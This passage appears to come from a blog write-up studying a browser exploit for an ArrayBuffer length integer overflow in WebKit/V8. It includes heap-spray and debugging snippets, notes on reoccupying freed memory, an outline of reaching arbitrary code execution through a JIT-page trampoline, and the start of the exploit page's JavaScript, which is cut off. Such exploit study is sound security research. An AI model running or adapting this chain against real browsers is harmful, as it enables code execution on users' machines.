class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">ArrayBuffer* V8ArrayBuffer::toNative(v8::Handle&lt;v8::Object&gt; object)</span><br><span class="line">&#123;</span><br><span class="line">...</span><br><span class="line">    v8::ArrayBuffer::Contents v8Contents = v8buffer-&gt;Externalize();</span><br><span class="line"></span><br><span class="line">    ArrayBufferContents contents(v8Contents.Data(), v8Contents.ByteLength(),</span><br><span class="line">        V8ArrayBufferDeallocationObserver::instanceTemplate());</span><br><span class="line"></span><br><span class="line">    RefPtr&lt;ArrayBuffer&gt; buffer = ArrayBuffer::create(contents);</span><br><span class="line"></span><br><span class="line">    V8DOMWrapper::associateObjectWithWrapper&lt;V8ArrayBuffer&gt;(buffer.release(), &amp;wrapperTypeInfo, object, v8::Isolate::GetCurrent(), WrapperConfiguration::Dependent);</span><br><span class="line">...</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">bufferData1Method</span><span class="params">(<span class="keyword">const</span> v8::FunctionCallbackInfo&lt;v8::Value&gt;&amp; info)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">...</span><br><span class="line">    V8TRYCATCH_VOID(ArrayBuffer*, data, info[<span class="number">1</span>]-&gt;IsArrayBuffer() ? V8ArrayBuffer::toNative(v8::Handle&lt;v8::ArrayBuffer&gt;::Cast(info[<span class="number">1</span>])) : <span class="number">0</span>);</span><br><span class="line">...</span><br><span class="line">    imp-&gt;bufferData(target, data, usage);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="回调"><a href="#回调" class="headerlink" title="回调"></a>回调</h2><p><code>obj.__defineGetter__(property, func)</code><br>The square bracket array syntax (eg: foo[1]) when applied to regular javascript objects is also just reading a property, even if the property is a number this will still invoke a getter if one has been defined.</p><h2 id="需要调试的"><a href="#需要调试的" class="headerlink" title="需要调试的"></a>需要调试的</h2><p>backing store</p><ul><li><p>Uint8<br>meta 0x13381<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-06-024853.png" alt=""></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> t_arr=<span class="keyword">new</span> <span class="built_in">Uint8Array</span>(<span class="number">0x13370</span>);</span><br><span class="line">t_arr[<span class="number">0</span>]=<span class="number">1</span>;</span><br><span class="line">t_arr[<span class="number">1</span>]=<span class="number">2</span>;</span><br><span class="line">t_arr[<span class="number">2</span>]=<span class="number">3</span>;</span><br><span class="line">t_arr[<span class="number">3</span>]=<span class="number">4</span>;</span><br><span class="line"></span><br><span class="line">%DebugPrint(t_arr)</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>);</span><br></pre></td></tr></table></figure></li><li><p>Float64<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-06-024759.png" alt=""><br>meta 0x9a002<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-06-024821.png" alt=""></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> t_arr=<span class="keyword">new</span> <span class="built_in">Float64Array</span>(<span class="number">0x13370</span>);</span><br><span class="line">t_arr[<span class="number">0</span>]=<span class="number">1.0</span>;</span><br><span class="line">t_arr[<span class="number">1</span>]=<span class="number">2.0</span>;</span><br><span class="line">t_arr[<span class="number">2</span>]=<span class="number">3.0</span>;</span><br><span class="line">t_arr[<span class="number">3</span>]=<span class="number">4.0</span>;</span><br><span class="line"></span><br><span class="line">%DebugPrint(t_arr)</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>);</span><br></pre></td></tr></table></figure></li></ul><p>其他需要调试的<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">initialOverwrite</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> arrays = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">300</span>);</span><br><span class="line">    <span class="keyword">var</span> arraysI = <span class="number">0</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">createArray</span>(<span class="params">byteSize, num</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> a = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>(byteSize);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; byteSize; i++) &#123;</span><br><span class="line">            a[i] = <span class="number">0x42</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        arrays[arraysI++] = a;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; arrays.length; i++) &#123;</span><br><span class="line">    createArray(<span class="number">0x20000</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>思路，调试到backstore，看一下页分布？</p><h2 id="log"><a href="#log" class="headerlink" title="log"></a>log</h2><ol><li>因为我们知道如果相乘溢出，它会溢出到数组长度以下，有没有问题？<br>曾经有一段时间我这么认为。但是，在某些情况下它会溢出，但是绕过判断。<br>例如，0x24924924(length) float64（8字节）在32位环境中受到保护。<br>然后byte_length溢出，byte_length = 0x24924924 * 8 = 0x124924928 -&gt; 0x24924928<br>但在32位环境中它不满足byte_length &lt; length,并将通过检查。</li></ol><ol><li><p>修改大小并free chunk(j)之后用WTF::ArrayBuffer占位<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-07-06-024535.png" alt=""></p></li><li><p>all the ArrayBuffer structures we’ve seen up until now (apart from the actual backing buffer) have been in the V8 GC heap whereas the memory corruption is happening in the dlmalloc heap.</p></li><li><p>Well, from here on, we prepare to execute arbitrary code (prepareForCalls).<br>We also make WTF :: DataView and read its vtbl. Then, since you know the position of .text, search for gadget (code fragment) calling dlsym from there. Follow PLT (Procedure Linkage Table) and load the thread_data<em>table</em> pointer of v8. Then you follow the structure and you will know the position of JS’s heap. There is also rwx JITed code storage. Then eval the function that generates dummy findable code, find the JIT machine code, and rewrite it to trampoline. Trampoline is a piece of code that calls a function by writing the value written in callbuf back to the register so that you can call any native function or systemcall with arbitrary argument using the function on JS! The attacker could now completely control the inside of the sandbox.</p></li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br><span class="line">704</span><br><span class="line">705</span><br><span class="line">706</span><br><span class="line">707</span><br><span class="line">708</span><br><span class="line">709</span><br><span class="line">710</span><br><span class="line">711</span><br><span class="line">712</span><br><span class="line">713</span><br><span class="line">714</span><br><span class="line">715</span><br><span class="line">716</span><br><span class="line">717</span><br><span class="line">718</span><br><span class="line">719</span><br><span class="line">720</span><br><span class="line">721</span><br><span class="line">722</span><br><span class="line">723</span><br><span class="line">724</span><br><span class="line">725</span><br><span class="line">726</span><br><span class="line">727</span><br><span class="line">728</span><br><span class="line">729</span><br><span class="line">730</span><br><span class="line">731</span><br><span class="line">732</span><br><span class="line">733</span><br><span class="line">734</span><br><span class="line">735</span><br><span class="line">736</span><br><span class="line">737</span><br><span class="line">738</span><br><span class="line">739</span><br><span class="line">740</span><br><span class="line">741</span><br><span class="line">742</span><br><span class="line">743</span><br><span class="line">744</span><br><span class="line">745</span><br><span class="line">746</span><br><span class="line">747</span><br><span class="line">748</span><br><span class="line">749</span><br><span class="line">750</span><br><span class="line">751</span><br><span class="line">752</span><br><span class="line">753</span><br><span class="line">754</span><br><span class="line">755</span><br><span class="line">756</span><br><span class="line">757</span><br><span class="line">758</span><br><span class="line">759</span><br><span class="line">760</span><br><span class="line">761</span><br><span class="line">762</span><br><span class="line">763</span><br><span class="line">764</span><br><span class="line">765</span><br><span class="line">766</span><br><span class="line">767</span><br><span class="line">768</span><br><span class="line">769</span><br><span class="line">770</span><br><span class="line">771</span><br><span class="line">772</span><br><span class="line">773</span><br><span class="line">774</span><br><span class="line">775</span><br><span class="line">776</span><br><span class="line">777</span><br><span class="line">778</span><br><span class="line">779</span><br><span class="line">780</span><br><span class="line">781</span><br><span class="line">782</span><br><span class="line">783</span><br><span class="line">784</span><br><span class="line">785</span><br><span class="line">786</span><br><span class="line">787</span><br><span class="line">788</span><br><span class="line">789</span><br><span class="line">790</span><br><span class="line">791</span><br><span class="line">792</span><br><span class="line">793</span><br><span class="line">794</span><br><span class="line">795</span><br><span class="line">796</span><br><span class="line">797</span><br><span class="line">798</span><br><span class="line">799</span><br><span class="line">800</span><br><span class="line">801</span><br><span class="line">802</span><br><span class="line">803</span><br><span class="line">804</span><br><span class="line">805</span><br><span class="line">806</span><br><span class="line">807</span><br><span class="line">808</span><br><span class="line">809</span><br><span class="line">810</span><br><span class="line">811</span><br><span class="line">812</span><br><span class="line">813</span><br><span class="line">814</span><br><span class="line">815</span><br><span class="line">816</span><br><span class="line">817</span><br><span class="line">818</span><br><span class="line">819</span><br><span class="line">820</span><br><span class="line">821</span><br><span class="line">822</span><br><span class="line">823</span><br><span class="line">824</span><br><span class="line">825</span><br><span class="line">826</span><br><span class="line">827</span><br><span class="line">828</span><br><span class="line">829</span><br><span class="line">830</span><br><span class="line">831</span><br><span class="line">832</span><br><span class="line">833</span><br><span class="line">834</span><br><span class="line">835</span><br><span class="line">836</span><br><span class="line">837</span><br><span class="line">838</span><br><span class="line">839</span><br><span class="line">840</span><br><span class="line">841</span><br><span class="line">842</span><br><span class="line">843</span><br><span class="line">844</span><br><span class="line">845</span><br><span class="line">846</span><br><span class="line">847</span><br><span class="line">848</span><br><span class="line">849</span><br><span class="line">850</span><br><span class="line">851</span><br><span class="line">852</span><br><span class="line">853</span><br><span class="line">854</span><br><span class="line">855</span><br><span class="line">856</span><br><span class="line">857</span><br><span class="line">858</span><br><span class="line">859</span><br><span class="line">860</span><br><span class="line">861</span><br><span class="line">862</span><br><span class="line">863</span><br><span class="line">864</span><br><span class="line">865</span><br><span class="line">866</span><br><span class="line">867</span><br><span class="line">868</span><br><span class="line">869</span><br><span class="line">870</span><br><span class="line">871</span><br><span class="line">872</span><br><span class="line">873</span><br><span class="line">874</span><br><span class="line">875</span><br><span class="line">876</span><br><span class="line">877</span><br><span class="line">878</span><br><span class="line">879</span><br><span class="line">880</span><br><span class="line">881</span><br><span class="line">882</span><br><span class="line">883</span><br><span class="line">884</span><br><span class="line">885</span><br><span class="line">886</span><br><span class="line">887</span><br><span class="line">888</span><br><span class="line">889</span><br><span class="line">890</span><br><span class="line">891</span><br><span class="line">892</span><br><span class="line">893</span><br><span class="line">894</span><br><span class="line">895</span><br><span class="line">896</span><br><span class="line">897</span><br><span class="line">898</span><br><span class="line">899</span><br><span class="line">900</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=<span class="string">"?"</span>&gt;---------<span class="xml"><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span></span><br><span class="line">&lt;script&gt;</span><br><span class="line"><span class="keyword">var</span> time = <span class="string">'?'</span> + <span class="built_in">Math</span>.floor(<span class="keyword">new</span> <span class="built_in">Date</span>().getTime() / <span class="number">1000</span>);</span><br><span class="line"><span class="keyword">if</span>((<span class="built_in">window</span>.location + <span class="string">''</span>).indexOf(time) == <span class="number">-1</span>) &#123;</span><br><span class="line">    <span class="built_in">window</span>.location = time;</span><br><span class="line">    <span class="keyword">throw</span> <span class="string">'no'</span>;</span><br><span class="line">&#125;</span><br><span class="line">alert(<span class="string">'Ready.\nThis is a Slow Exploit.'</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">crash</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> nooo = [];</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">        nooo.push(<span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x10000000</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//alert = print;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 强制将ArrayBuffer转换为native wrapper，用于后面修改其长度</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// This WebGL stuff is just to force an ArrayBuffer or ArrayBufferView to</span></span><br><span class="line"><span class="comment">// create a native wrapper, hopefully without allocating anything else (to</span></span><br><span class="line"><span class="comment">// simplify assumptions).</span></span><br><span class="line"><span class="keyword">var</span> canvas = <span class="built_in">document</span>.createElement(<span class="string">'canvas'</span>);</span><br><span class="line">gl = canvas.getContext(<span class="string">"webgl"</span>) || canvas.getContext(<span class="string">"experimental-webgl"</span>);</span><br><span class="line"><span class="keyword">if</span>(!gl) &#123;</span><br><span class="line">    alert(<span class="string">'no webgl'</span>);</span><br><span class="line">    <span class="keyword">throw</span> <span class="string">''</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> ext = gl.getExtension(<span class="string">'WEBGL_lose_context'</span>);</span><br><span class="line"><span class="keyword">if</span>(!ext) &#123;</span><br><span class="line">    alert(<span class="string">'no lose_context'</span>);</span><br><span class="line">    <span class="keyword">throw</span> <span class="string">''</span>;</span><br><span class="line">&#125;</span><br><span class="line">ext.loseContext();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">force</span>(<span class="params">buffer</span>) </span>&#123;</span><br><span class="line">    gl.bufferData(<span class="number">0</span>, buffer, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ---</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> thingiesToFree = [];</span><br><span 